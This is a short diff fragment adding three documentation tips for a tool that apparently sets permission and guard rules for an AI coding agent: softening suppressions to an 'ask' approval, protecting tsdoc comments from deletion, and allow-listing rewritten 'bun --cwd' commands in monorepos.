+- Soften suppressions to `action = "ask"` if you occasionally approve one.
+- Protect tsdoc comments from "cleanup" with `removed_pattern` — see [protect-docs-and-tests.md](protect-docs-and-tests.md).
+- Monorepos: the `pm-cwd` module rewrites `cd pkg && bun run lint` to `bun --cwd pkg run lint`; add `match = "bun --cwd * run*"` allow rules so the rewritten form is auto-approved too.
